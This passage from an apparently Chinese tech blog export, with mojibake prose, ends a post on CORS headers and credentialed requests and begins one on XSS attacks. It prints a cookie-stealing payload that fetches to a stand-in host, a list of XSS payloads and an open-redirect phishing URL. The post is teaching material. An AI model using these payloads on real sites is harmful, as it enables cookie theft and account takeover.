å’Œ Content-Typeã€‚ æœåŠ¡å™¨æ®æ­¤å†³å®šï¼Œè¯¥è¯·æ±‚æ˜¯å¦è¢«å…è®¸ã€‚ ç¬¬ 14-16 è¡Œä¸ºé¢„æ£€è¯·æ±‚çš„å“åº”ï¼Œ è¡¨æ˜æœåŠ¡å™¨å°†æ¥å—åç»­çš„å®é™…è¯·æ±‚ã€‚é‡ç‚¹çœ‹ 17-19 è¡Œï¼š 1234Access-Control-Allow-Origin: http://foo.exampleAccess-Control-Allow-Methods: POST, GET, OPTIONSAccess-Control-Allow-Headers: X-PINGOTHER, Content-TypeAccess-Control-Max-Age: 86400 Access-Control-Allow-Methodsï¼šè¡¨ç¤ºæœåŠ¡å™¨å…è®¸å®¢æˆ·ç«¯ä½¿ç”¨çš„è¯·æ±‚æ–¹æ³•ï¼Œåœ¨è¿™é‡Œæ˜¯ POSTã€GETã€OPTIONSã€‚ Access-Control-Allow-Headersï¼šè¡¨ç¤ºæœåŠ¡å™¨å…è®¸è¯·æ±‚ä¸­æºå¸¦çš„è‡ªå®šä¹‰å­—æ®µï¼Œåœ¨è¿™é‡Œæ˜¯X-PINGOTHER, Content-Typeã€‚ä¸ Access-Control-Allow-Methods ä¸€æ ·ï¼ŒAccess-Control-Allow-Headers çš„å€¼ä¸ºè‹±æ–‡é€—å·åˆ†éš”çš„åˆ—è¡¨ã€‚ Access-Control-Max-Ageï¼šè¡¨ç¤ºè¯¥å“åº”çš„æœ‰æ•ˆæ—¶é—´ä¸º 86400 ç§’ï¼Œä¹Ÿå°±æ˜¯ 24 å°æ—¶ã€‚åœ¨æœ‰æ•ˆæ—¶é—´å†…ï¼Œæµè§ˆå™¨æ— é¡»ä¸ºåŒä¸€è¯·æ±‚å†æ¬¡å‘èµ·é¢„æ£€è¯·æ±‚ã€‚è¯·æ³¨æ„ï¼Œæµè§ˆå™¨ç»´æŠ¤äº†ä¸€ä¸ªæœ€å¤§çš„æœ‰æ•ˆæ—¶é—´ï¼Œå¦‚æœè¯¥é¦–éƒ¨å­—æ®µçš„è¶…è¿‡äº†æœ€å¤§çš„æœ‰æ•ˆæ—¶é—´ï¼Œå°†ä¸ä¼šç”Ÿæ•ˆã€‚ é™„å¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚Fetch ä¸ CORS çš„ä¸€ä¸ªæœ‰è¶£çš„ç‰¹æ€§æ˜¯ï¼Œå¯ä»¥åŸºäº HTTP cookies å’Œ HTTP è®¤è¯ä¿¡æ¯å‘é€èº«ä»½å‡­è¯ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œå¯¹äºè·¨åŸŸ XMLHttpRequest æˆ– Fetch è¯·æ±‚ï¼Œæµè§ˆå™¨ä¸ä¼šå‘é€èº«ä»½å‡­è¯ä¿¡æ¯ã€‚å¦‚æœè¦å‘é€å‡­è¯ä¿¡æ¯ï¼Œéœ€è¦è®¾ç½® XMLHttpRequest çš„æŸä¸ªç‰¹æ®Šæ ‡è¯†ä½ã€‚ å¦‚ä¸‹ï¼Œhttp://foo.example çš„æŸè„šæœ¬ å‘ http://bar.other å‘èµ·ä¸€ä¸ª GET è¯·æ±‚ï¼Œå¹¶è®¾ç½® Cookie: 1234567891011let invocation = new XMLHttpRequest();let url = 'http://bar.other/resources/credentialed-content/'; function callOtherDomain() &#123; if (invocation) &#123; invocation.open('GET', url, true); invocation.withCredentials = true; invocation.onreadystatechange = handler; invocation.send(); &#125;&#125; ç¬¬ 7 è¡Œå°† XMLHttpRequest çš„ withCredentials çš„æ ‡å¿—è®¾ç½®ä¸º trueï¼Œä»è€Œå‘æœåŠ¡å™¨å‘é€ Cookieã€‚å› ä¸ºè¿™æ˜¯ä¸€ä¸ªç®€å•çš„ GET è¯·æ±‚ï¼Œæ‰€ä»¥æµè§ˆå™¨ä¸ä¼šå‘èµ·é¢„æ£€è¯·æ±‚ã€‚ä½†æ˜¯ï¼Œå¦‚æœæœåŠ¡å™¨çš„å“åº”ä¸­æœªæºå¸¦ Access-Control-Allow-Credentials: trueï¼Œæµè§ˆå™¨å°†ä¸ä¼šæŠŠå“åº”å†…å®¹è¿”å›ç»™è¯·æ±‚çš„å‘é€è€…ã€‚ Fetch çš„ç‰¹æ®Šæ ‡å¿—å¦‚ä¸‹ï¼šcredentials: â€˜includeâ€™ 12345678910let requestConfig = &#123; credentials: 'include', method: type, headers: &#123; 'Accept': 'application/json', 'Content-Type' : 'application/json' &#125;, mode: "cors", cache: "force-cache"&#125; é™„å¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚ä¸é€šé…ç¬¦å¯¹äºé™„å¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨ä¸å¾—è®¾ç½® Access-Control-Allow-Origin çš„å€¼ä¸ºâ€*â€ã€‚ è¿™æ˜¯å› ä¸ºè¯·æ±‚çš„é¦–éƒ¨ä¸­æºå¸¦äº† Cookie çš„ä¿¡æ¯ï¼Œå¦‚æœ Access-Control-Allow-Origin çš„å€¼ä¸º â€œ*â€ï¼Œè¯·æ±‚å°†ä¼šå¤±è´¥ã€‚ form è¡¨å•çš„è·¨åŸŸé—®é¢˜å½“ form è¡¨å•è·¨åŸŸæäº¤æ•°æ®çš„æ—¶å€™ï¼ŒåŸé¡µé¢ä¼šè·³è½¬åˆ°æ–°é¡µé¢ï¼ˆè¿™æ ·åŸé¡µé¢è„šæœ¬ä¾¿æ— æ³•è·å–æ–°é¡µé¢çš„å†…å®¹ï¼Œæµè§ˆå™¨å› æ­¤è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼‰ï¼Œç›¸å½“äº a æ ‡ç­¾è·³è½¬ä¸€æ ·ï¼Œå› è€Œä¼šå¸¦ä¸Šç¼“å­˜åœ¨æœ¬åœ°çš„æ–°é¡µé¢çš„ cookieï¼Œå¹¶ä¸”å¯ä»¥æäº¤æˆåŠŸã€‚ï¼ˆè¿™ä¹Ÿæ˜¯ csrf èƒ½æ”»å‡»æˆåŠŸï¼Œè€Œä¸ä¼šè¢«åŒæºç­–ç•¥é™åˆ¶çš„åŸå› ï¼‰ ä½†æ˜¯å› ä¸ºä¸åŒæºä¹‹é—´çš„è·³è½¬ï¼Œrequest ä¹Ÿä¼šå¸¦ä¸Š originï¼Œreferç­‰å­—æ®µï¼Œå¯ä»¥ä¾æ®è¿™äº›å­—æ®µé™åˆ¶ä¸å¯ä¿¡çš„è·¨åŸŸè®¿é—®ï¼Œè¿™äº›æ¶‰åŠåˆ° csrf é˜²å¾¡çš„é—®é¢˜äº†ï¼Œåœ¨å¦ä¸€ç¯‡ csrf é˜²å¾¡å’Œæ”»å‡»æœ‰è¯¦ç»†è¯´æ˜ã€‚ HTTP å“åº”é¦–éƒ¨å­—æ®µæœ¬èŠ‚åˆ—å‡ºäº†è§„èŒƒæ‰€å®šä¹‰çš„å“åº”é¦–éƒ¨å­—æ®µã€‚ä¸Šä¸€å°èŠ‚ä¸­ï¼Œæˆ‘ä»¬å·²ç»çœ‹åˆ°äº†è¿™äº›é¦–éƒ¨å­—æ®µåœ¨å®é™…åœºæ™¯ä¸­æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚ Access-Control-Allow-Originå“åº”é¦–éƒ¨ä¸­å¯ä»¥æºå¸¦ä¸€ä¸ª Access-Control-Allow-Originå­—æ®µï¼Œå…¶è¯­æ³•å¦‚ä¸‹: 1Access-Control-Allow-Origin: &lt;origin&gt; | * å…¶ä¸­ï¼Œorigin å‚æ•°çš„å€¼æŒ‡å®šäº†å…è®¸è®¿é—®è¯¥èµ„æºçš„å¤–åŸŸ URIã€‚å¯¹äºä¸éœ€è¦æºå¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯ä»¥æŒ‡å®šè¯¥å­—æ®µçš„å€¼ä¸ºé€šé…ç¬¦ï¼Œè¡¨ç¤ºå…è®¸æ¥è‡ªæ‰€æœ‰åŸŸçš„è¯·æ±‚ã€‚ ä¾‹å¦‚ï¼Œä¸‹é¢çš„å­—æ®µå€¼å°†å…è®¸æ¥è‡ª http://mozilla.com çš„è¯·æ±‚ï¼š 1Access-Control-Allow-Origin: http://mozilla.com å¦‚æœæœåŠ¡ç«¯æŒ‡å®šäº†å…·ä½“çš„åŸŸåè€Œéâ€œ*â€ï¼Œé‚£ä¹ˆå“åº”é¦–éƒ¨ä¸­çš„ Vary å­—æ®µçš„å€¼å¿…é¡»åŒ…å« Originã€‚è¿™å°†å‘Šè¯‰å®¢æˆ·ç«¯ï¼šæœåŠ¡å™¨å¯¹ä¸åŒçš„æºç«™è¿”å›ä¸åŒçš„å†…å®¹ã€‚ Access-Control-Expose-Headersè¯‘è€…æ³¨ï¼šåœ¨è·¨åŸŸè®¿é—®æ—¶ï¼ŒXMLHttpRequestå¯¹è±¡çš„getResponseHeader()æ–¹æ³•åªèƒ½æ‹¿åˆ°ä¸€äº›æœ€åŸºæœ¬çš„å“åº”å¤´ï¼ŒCache-Controlã€Content-Languageã€Content-Typeã€Expiresã€Last-Modifiedã€Pragmaï¼Œå¦‚æœè¦è®¿é—®å…¶ä»–å¤´ï¼Œåˆ™éœ€è¦æœåŠ¡å™¨è®¾ç½®æœ¬å“åº”å¤´ã€‚ Access-Control-Expose-Headers å¤´è®©æœåŠ¡å™¨æŠŠå…è®¸æµè§ˆå™¨è®¿é—®çš„å¤´æ”¾å…¥ç™½åå•ï¼Œä¾‹å¦‚ï¼š 1Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header è¿™æ ·æµè§ˆå™¨å°±èƒ½å¤Ÿé€šè¿‡getResponseHeaderè®¿é—®X-My-Custom-Headerå’Œ X-Another-Custom-Header å“åº”å¤´äº†ã€‚ Access-Control-Max-AgeAccess-Control-Max-Age å¤´æŒ‡å®šäº†preflightè¯·æ±‚çš„ç»“æœèƒ½å¤Ÿè¢«ç¼“å­˜å¤šä¹…ï¼Œè¯·å‚è€ƒæœ¬æ–‡åœ¨å‰é¢æåˆ°çš„preflightä¾‹å­ã€‚ 1Access-Control-Max-Age: &lt;delta-seconds&gt; delta-seconds å‚æ•°è¡¨ç¤ºpreflightè¯·æ±‚çš„ç»“æœåœ¨å¤šå°‘ç§’å†…æœ‰æ•ˆã€‚ Access-Control-Allow-CredentialsAccess-Control-Allow-Credentials å¤´æŒ‡å®šäº†å½“æµè§ˆå™¨çš„credentialsè®¾ç½®ä¸ºtrueæ—¶æ˜¯å¦å…è®¸æµè§ˆå™¨è¯»å–responseçš„å†…å®¹ã€‚å½“ç”¨åœ¨å¯¹preflighté¢„æ£€æµ‹è¯·æ±‚çš„å“åº”ä¸­æ—¶ï¼Œå®ƒæŒ‡å®šäº†å®é™…çš„è¯·æ±‚æ˜¯å¦å¯ä»¥ä½¿ç”¨credentialsã€‚è¯·æ³¨æ„ï¼šç®€å• GET è¯·æ±‚ä¸ä¼šè¢«é¢„æ£€ï¼›å¦‚æœå¯¹æ­¤ç±»è¯·æ±‚çš„å“åº”ä¸­ä¸åŒ…å«è¯¥å­—æ®µï¼Œè¿™ä¸ªå“åº”å°†è¢«å¿½ç•¥æ‰ï¼Œå¹¶ä¸”æµè§ˆå™¨ä¹Ÿä¸ä¼šå°†ç›¸åº”å†…å®¹è¿”å›ç»™ç½‘é¡µã€‚ 1Access-Control-Allow-Credentials: true ä¸Šæ–‡å·²ç»è®¨è®ºäº†é™„å¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚ã€‚ Access-Control-Allow-MethodsAccess-Control-Allow-Methods é¦–éƒ¨å­—æ®µç”¨äºé¢„æ£€è¯·æ±‚çš„å“åº”ã€‚å…¶æŒ‡æ˜äº†å®é™…è¯·æ±‚æ‰€å…è®¸ä½¿ç”¨çš„ HTTP æ–¹æ³•ã€‚ 1Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]* ç›¸å…³ç¤ºä¾‹è§è¿™é‡Œã€‚ Access-Control-Allow-HeadersAccess-Control-Allow-Headers é¦–éƒ¨å­—æ®µç”¨äºé¢„æ£€è¯·æ±‚çš„å“åº”ã€‚å…¶æŒ‡æ˜äº†å®é™…è¯·æ±‚ä¸­å…è®¸æºå¸¦çš„é¦–éƒ¨å­—æ®µã€‚ 1Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]* HTTP è¯·æ±‚é¦–éƒ¨å­—æ®µæœ¬èŠ‚åˆ—å‡ºäº†å¯ç”¨äºå‘èµ·è·¨åŸŸè¯·æ±‚çš„é¦–éƒ¨å­—æ®µã€‚è¯·æ³¨æ„ï¼Œè¿™äº›é¦–éƒ¨å­—æ®µæ— é¡»æ‰‹åŠ¨è®¾ç½®ã€‚ å½“å¼€å‘è€…ä½¿ç”¨ XMLHttpRequest å¯¹è±¡å‘èµ·è·¨åŸŸè¯·æ±‚æ—¶ï¼Œå®ƒä»¬å·²ç»è¢«è®¾ç½®å°±ç»ªã€‚ OriginOrigin é¦–éƒ¨å­—æ®µè¡¨æ˜é¢„æ£€è¯·æ±‚æˆ–å®é™…è¯·æ±‚çš„æºç«™ã€‚ 1Origin: &lt;origin&gt; origin å‚æ•°çš„å€¼ä¸ºæºç«™ URIã€‚å®ƒä¸åŒ…å«ä»»ä½•è·¯å¾„ä¿¡æ¯ï¼Œåªæ˜¯æœåŠ¡å™¨åç§°ã€‚ Note: æœ‰æ—¶å€™å°†è¯¥å­—æ®µçš„å€¼è®¾ç½®ä¸ºç©ºå­—ç¬¦ä¸²æ˜¯æœ‰ç”¨çš„ï¼Œä¾‹å¦‚ï¼Œå½“æºç«™æ˜¯ä¸€ä¸ª data URL æ—¶ã€‚ æ³¨æ„ï¼Œä¸ç®¡æ˜¯å¦ä¸ºè·¨åŸŸè¯·æ±‚ï¼ŒORIGIN å­—æ®µæ€»æ˜¯è¢«å‘é€ã€‚ Access-Control-Request-MethodAccess-Control-Request-Method é¦–éƒ¨å­—æ®µç”¨äºé¢„æ£€è¯·æ±‚ã€‚å…¶ä½œç”¨æ˜¯ï¼Œå°†å®é™…è¯·æ±‚æ‰€ä½¿ç”¨çš„ HTTP æ–¹æ³•å‘Šè¯‰æœåŠ¡å™¨ã€‚ 1Access-Control-Request-Method: &lt;method&gt; ç›¸å…³ç¤ºä¾‹è§è¿™é‡Œã€‚ Access-Control-Request-HeadersAccess-Control-Request-Headers é¦–éƒ¨å­—æ®µç”¨äºé¢„æ£€è¯·æ±‚ã€‚å…¶ä½œç”¨æ˜¯ï¼Œå°†å®é™…è¯·æ±‚æ‰€æºå¸¦çš„é¦–éƒ¨å­—æ®µå‘Šè¯‰æœåŠ¡å™¨ã€‚ 1Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS æ”»å‡»å’Œé˜²å¾¡]]></title>
    <url>%2FXSS%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[XSS ç®€ä»‹xss å…¨ç§°(Cross Site Scripting)è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œä¸ºäº†ä¸å’Œå±‚å æ ·å¼è¡¨(Cascading Style Sheet, CSS) ç¼©å†™æ··æ·†ï¼Œå› æ­¤å†™ä½œ XSSã€‚å±äºä¸€ç§è„šæœ¬æ³¨å…¥æ”»å‡»ï¼Œä¹Ÿå°±æ˜¯æ”»å‡»è€…æŠŠæ¶æ„è„šæœ¬ã€htmlæ³¨å…¥ç½‘ç«™ï¼Œå½“å‰å…¶ä»–ç”¨æˆ·è®¿é—®çš„æ—¶å€™ï¼Œè¿™äº›æ¶æ„è„šæœ¬ã€html å°±åœ¨æ³¨å…¥çš„ç½‘ç«™çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œä»è€Œå¯¹è®¿é—®è€…é€ æˆæ”»å‡»ã€‚ XSS æ”»å‡»å±å®³ ç›—å–ç”¨æˆ· Cookieï¼šæœ‰ä¸€å¤©ä½ å‘ç°ä»…å‰© 4 å—é’±ï¼ˆä¸€ä¸ªæ¡¶é¢ï¼‰ä½™é¢çš„é“¶è¡Œå¡ï¼Œè¢«è½¬èµ°äº†3.5 å—åˆ°ä¸€ä½é™Œç”Ÿç”¨æˆ·ï¼Œç—›å“­æµæ¶•çš„æƒ³ç€è‡ªå·±çš„æ™šé¤ï¼ˆæ¡¶é¢ï¼‰çš„æƒ…å†µä¸‹æ‹¨é€šäº†å®¢æœç”µè¯ï¼Œæ¥ç”µè¯çš„è¿˜æ˜¯ä¸ªç”·çš„ï¼Œé¡¿æ—¶ç«å†’ä¸‰ä¸ˆï¼šè°è½¬èµ°äº†æˆ‘çš„æ¡¶é¢ï¼Œå“¦ä¸ï¼Œ3.5 å—? å®¢æœæŸ¥äº†ä¸‹è½¬è´¦è®°å½•è¯´ï¼šå…ˆç”Ÿï¼Œæ‚¨äºæŸæ—¶æŸåˆ†æŸåœ°ç™»å½•é“¶è¡Œç½‘ç«™è½¬äº† 3.5 å—ç»™æŸæŸã€‚æ­¤å¤„çœç•¥1000å­—â€¦â€¦.ï¼Œå¾ˆå¯èƒ½å°±æ˜¯ Cookie è¢«ç›—èµ°äº†ï¼Œåˆ©ç”¨ä½ åœ¨ç½‘ç«™çš„æƒé™æŠŠé’±è½¬èµ°ï¼Œè¿˜æœ‰ 5 æ¯›ä¹°ä¸ªç³–ç“œå§ã€‚ å¯¼èˆªåˆ°æ¶æ„ç½‘ç«™ï¼šç‚¹å‡»æŸä¸ªè¿æ¥ï¼Œè¿›å»çš„å´æ˜¯å¦å¤–ä¸€ä¸ªæ¶ä¿—ç½‘ç«™ã€‚ è®°å½•ç”¨æˆ·è¡Œä¸ºï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡ä½¿ç”¨ addEventListener æ–¹æ³•æ³¨å†Œç›‘å¬é”®ç›˜äº‹ä»¶çš„å›è°ƒå‡½æ•°ï¼Œå¹¶æŠŠæ‰€æœ‰ç”¨æˆ·è¡Œä¸ºå‘é€åˆ°æœåŠ¡å™¨ï¼Œè¿™äº›æ•²å‡»è¡Œä¸ºå¯èƒ½è®°å½•è€…ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚å¯†ç å’Œä¿¡ç”¨å¡ä¿¡æ¯ã€‚ æ’å…¥å¹¿å‘Šï¼šæ˜¯å¦æœ‰è¿‡è¿™æ ·çš„ç»å†ï¼Œå½“ä½ é€šè¿‡æŸä¸ªè¿æ¥è¿›å…¥æŸä¸ªç½‘ç«™çš„æ—¶å€™å‘ç°ä¸€é¡¿ä¸å ªå…¥ç›®çš„å¹¿å‘Šï¼ˆå‰æçš„æ˜¯ä½ æ²¡å¼€å¹¿å‘Šæ‹¦æˆªå™¨ï¼‰ é’“é±¼ç½‘ç«™ï¼šè¿™ä¸ªè¯æ˜¯å¦ç»å¸¸åœ¨æŸæŸæ–°é—» APP ä¸Šçœ‹åˆ°ï¼Ÿæ”»å‡»è€…ä¿®æ”¹ DOM æ’å…¥å‡çš„ç™»å½•æ¡†ï¼Œæˆ–è€…æŠŠè¡¨å•çš„action å±æ€§æŒ‡å‘ä»–è‡ªå·±çš„æœåŠ¡å™¨ï¼Œç„¶åæ¬ºéª—ç”¨æˆ·æäº¤ç”¨æˆ·çš„é“­æ„Ÿä¿¡æ¯ã€‚ XSS æ”»å‡»æ–¹å¼æ—¢ç„¶ XSS å¯ä»¥é€ æˆè¿™ä¹ˆå¤§å±å®³ï¼Œå½“ç„¶åº”è¯¥å»ºç«‹ä¸€äº›é˜²èŒƒæªæ–½ã€‚ä½†æ˜¯ï¼Œä¸æ€¥ï¼Œåœ¨èŠé˜²èŒƒæ–¹å¼ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥åˆ†æ XSS æ˜¯æ€ä¹ˆå®ç°ä¸Šè¿°æ”»å‡»çš„ï¼Ÿæœ‰å“ªäº›æ”»å‡»æ–¹å¼ï¼Ÿå¦‚ä½•è”åˆå…¶ä»–æ”»å‡»æ–¹å¼ä¸€èµ·ä½¿ç”¨ï¼Ÿ XSS å…±åˆ†ä¸ºä¸‰ç§æ”»å‡»æ–¹å¼ï¼Œä»æ˜“ç”¨ä¸Šï¼Œå­˜å‚¨å‹ XSS &gt; DOM å‹ XSS &gt; åå°„å‹ XSSã€‚ å­˜å‚¨å‹ XSSæˆ‘ä»¬ä»ç®€å•çš„å¼€å§‹ï¼Œå­˜å‚¨å‹ XSS å°±æ˜¯å­˜å…¥äº†æ•°æ®åº“ï¼Œåœ¨å–å‡ºæ¥ï¼Œå¯¼è‡´ XSSã€‚æ¯”è¾ƒå…¸å‹çš„åœ°æ–¹æ˜¯ï¼šæ¶ˆæ¯è®ºå›ï¼Œè¯„è®ºåŒºï¼Œç•™è¨€æ¿ XSSã€‚æ”»å‡»è€…æ„é€ å¥½æ”»å‡»ä»£ç ï¼Œæäº¤åˆ°è¯„è®ºåŒºï¼Œå½“å…¶ä»–ç”¨æˆ·è¿›å…¥è¿™ä¸ªé¡µé¢çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä»æœåŠ¡å™¨æ‹‰å–æ•°æ®ï¼Œå¹¶åšæ­£å¸¸çš„ html å’Œ js è§£ææ‰§è¡Œï¼Œè¿›è€Œè§¦å‘ XSS æ”»å‡»ã€‚ 1æˆ·è®¿é—®é¡µé¢ &gt; æµè§ˆå™¨è·å– html | jsï¼ˆåŒ…æ‹¬æ”»å‡»ä»£ç ï¼‰è§£ææ‰§è¡Œ &gt; å®Œæˆæ”»å‡» é‚£ä¹ˆæ”»å‡»è€…æ˜¯å¦‚ä½•å‘ç° XSS æ¼æ´ï¼Œæœ‰æ˜¯å¦‚ä½•æ„é€ æ”»å‡»ä»£ç æäº¤åˆ°è¯„è®ºåŒºçš„å‘¢ï¼Ÿè¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤§é—®é¢˜ï¼Œè¿™é‡Œåˆ†æä¸ªç®€å•çš„demoï¼Œè¦çœ‹æ•´ä¸ªæ”»å‡»çš„åˆ†æè¿‡ç¨‹è¯·è½¬ åˆ˜å¿—é¾™å¤§ç¥-ä»é›¶å¼€å§‹å­¦ web å®‰å…¨ åŸæœ¬çš„ç•™è¨€ç‰ˆå¦‚ä¸‹ï¼š ä¸ºäº†ç®€å•ç‚¹ï¼Œä¸Šå›¾çš„ input æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ä¸è½¬ç ï¼Œæˆ‘ä»¬ç›´æ¥æäº¤ä¸‹é¢çš„ä»£ç ï¼ˆè¿™å…¶å®å°±æ˜¯ä¸€ç§å¸¸è§çš„ XSS payloadã€‚å…·ä½“è¯·çœ‹ä¸‹æ–‡åˆ†æï¼‰ï¼š 1hi, ä½ çš„ cookie è¦è¢«ç›—äº†å“Ÿ&lt;img src=1 onerror=&quot;fetch(`http://www.xsshack.com/?cookie=$&#123;document.cookie&#125;`)&quot; /&gt; å¯ä»¥å‘ç°å·²ç»å°†æ”»å‡»ä»£ç æ³¨å…¥åˆ°ç•™è¨€åŒºäº†ï¼š å½“å…¶ä»–ç”¨æˆ·è®¿é—®å½“å‰é¡µé¢çš„æ—¶å€™ï¼Œcookie å°±ä¼šè¢«ç›—å–ï¼ˆdemo çš„ url éšæ„å†™çš„ï¼Œå› æ­¤respose ä¼š 502ï¼‰ï¼š DOM å‹ XSSç®€å•ç†è§£å°±æ˜¯å®ƒçš„è¾“å‡ºç‚¹åœ¨ DOMï¼Œå’Œåç«¯å®Œå…¨æ²¡æœ‰å…³ç³»ï¼Œæ”»å‡»è€…åªè¦è¯±å¯¼åˆ«äººå»ç‚¹å‡»æœ‰ XSS ä»£ç çš„ URL å°±èƒ½å®ç°æ”»å‡»ã€‚çœ‹ä¸‹é¢çš„ demoï¼š åŸå§‹ä»£ç  å¸¦æœ‰ XSS ä»£ç çš„ URLï¼Œåªè¦å°†è¿™ä¸ªé“¾æ¥å‘å‡ºå»ï¼Œè¯±å¯¼å…¶ä»–äººç‚¹å‡»å°±èƒ½é€ æˆæ”»å‡»ï¼Œè¿™é‡ŒåŒæ ·ç”¨äº†ä¸Šé¢ä¾‹å­çš„ payload (è¿˜æŒºå¥½ç”¨çš„ ^_^) åå°„å‹ XSSåå°„å‹ XSSï¼Œä¹Ÿæ˜¯é€šè¿‡ç»™åˆ«äººå‘é€å¸¦æœ‰ XSS ä»£ç çš„é“¾æ¥ï¼Œè¯±å¯¼å…¶ä»–äººç‚¹å‡»è¿›è€Œé€ æˆæ”»å‡»ã€‚ä¸ DOM å‹ XSS ä¸åŒçš„æ˜¯ï¼Œè¿™ç±»å‹æ”»å‡»ä¸€èˆ¬å‡ºç°åœ¨æœç´¢é¡µé¢ï¼Œéœ€è¦å°†æ³¨å…¥ä»£ç ä»ç›®æ ‡æœåŠ¡å™¨é€šè¿‡é”™è¯¯ä¿¡æ¯ã€æœç´¢ç»“æœç­‰æ–¹å¼â€œåå°„â€å›æ¥ï¼Œåœ¨å—å®³è€…æµè§ˆå™¨ä¸Šæ‰§è¡Œï¼Œè€Œ DOM å‹ XSS æ˜¯ä¸éœ€è¦ç»è¿‡ç›®æ ‡æœåŠ¡å™¨çš„ï¼Œæ˜ç™½è¿™ç‚¹å°±å¾ˆå®¹æ˜“åŒºåˆ† åå°„æ€§ XSS å’Œ DOM å‹ XSS äº†ã€‚ çœ‹ä¸‹é¢è¿™ä¸ªç»å…¸æ¡ˆä¾‹ï¼š å¦‚ä¸‹ç™»å½•é¡µé¢ï¼Œæˆ‘ä»¬ä¸ºäº†ç”¨æˆ·èƒ½åœ¨ç™»å½•ä¹‹åè®¿é—®åˆ°ä¹‹å‰æµè§ˆçš„é¡µé¢ï¼Œæ‰€ä»¥åœ¨urlåŠ å…¥äº†ä¸€ä¸ªserviceå‚æ•°ï¼Œä½†æ˜¯æœªå¯¹å®ƒåšä»»ä½•æ ¡éªŒï¼Œå¯èƒ½ä¼šè¢«é’“é±¼ç½‘ç«™åˆ©ç”¨ã€‚ è¯¥æ”»å‡»å®ç°æ¡ä»¶ï¼š ç”¨æˆ·ç‚¹å‡»äº†å¦‚ä¸‹è¿æ¥ï¼šhttps://cas.utest.qq.com/qqlogin?service=http%3A%2F%2Fpianzi.comï¼› åç«¯æœªå¯¹serviceå‚æ•°åšæ ¡éªŒï¼Œè¿™ä¸ªè¿æ¥å¯ä»¥æ­£å¸¸è·³è½¬åˆ°ä¸Šå›¾çš„é¡µé¢ï¼› ç”¨æˆ·è¾“å…¥å¸å·ç™»å½•åï¼Œè·³è½¬åˆ° pianzi.comï¼› è¿™æ˜¯ä¸ªé’“é±¼ç½‘ç«™ï¼Œé€šè¿‡ç½‘ç«™é£æ ¼æ¬ºéª—ï¼Œå¯¹ç”¨æˆ·è¿›è¡Œå¼•å¯¼æ€§æ“ä½œï¼› ç”¨æˆ·è¾“å…¥ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ï¼› åœ¨ä¸çŸ¥ä¸è§‰ä¹‹é—´ï¼Œç”¨æˆ·æ³„æ¼äº†è‡ªå·±çš„ä¿¡æ¯ã€‚ XSS payloadä¸Šé¢æœ‰è°ˆåˆ°çªƒå– cookie çš„ demo ä¸­è°ˆåˆ°äº† XSS payload, XSS payload æ˜¯ä»€ä¹ˆï¼Ÿ XSSæ”»å‡»æˆåŠŸåï¼Œæ”»å‡»è€…èƒ½å¤Ÿå¯¹ç”¨æˆ·å½“å‰æµè§ˆçš„é¡µé¢æ¤å…¥æ¶æ„è„šæœ¬ï¼Œé€šè¿‡æ¶æ„è„šæœ¬ï¼Œæ§åˆ¶ç”¨æˆ·çš„æµè§ˆå™¨ã€‚è¿™äº›ç”¨å·²å®Œæˆå„ç§å…·ä½“åŠŸèƒ½çš„æ¶æ„è„šæœ¬ï¼Œè¢«ç§°ä¸ºâ€XSS payloadâ€ã€‚ XSS Payloadå®é™…ä¸Šå°±æ˜¯JavaScriptè„šæœ¬ï¼ˆè¿˜å¯ä»¥æ˜¯Flashæˆ–å…¶ä»–å¯Œå®¢æˆ·ç«¯çš„è„šæœ¬ï¼‰ï¼Œæ‰€ä»¥ä»»ä½•Javascriptè„šæœ¬èƒ½å®ç°çš„åŠŸèƒ½ï¼ŒXSS Payloadéƒ½èƒ½åšåˆ°ã€‚ ä¸¾å‡ ä¸ªåˆ—å­ï¼Œéå¸¸å¤šï¼š 12345678910111213&lt;script&gt;alert(1)&lt;/script&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;iframe onload=alert(1)&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;111&lt;/a&gt;&lt;marquee onscroll=alert(1)&gt;&lt;object data=&quot;javascript:alert(1)&quot;&gt;&lt;svg onload=alert(1)&gt;&lt;body onload=alert(1)&gt;&lt;select name=&quot;&quot; onmouseover=alert(1)&gt;&lt;script&gt;window.setAttribute(&apos;onload&apos;,alert(&apos;xss&apos;)&lt;/script&gt;Javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&lt;img src=1 onerror=with(body)createElement(&apos;script&apos;).src=&quot;å¤–éƒ¨JSåœ°å€&quot;&gt; å…¥ä¾µæ–¹æ³•ï¼ˆæ‘˜è‡ªXSSçš„åˆ©ç”¨æ–¹å¼â€”-(æœ½æœ¨åŸåˆ›)æ”»å‡»è€…å‘ç°xssæ¼æ´-&gt;æ„é€ ä»£ç -&gt;å‘é€ç»™å—å®³äºº-&gt;å—å®³äººæ‰“å¼€-&gt;çªƒå–å—å®³äººcookie-&gt;å®Œæˆæ”»å‡». 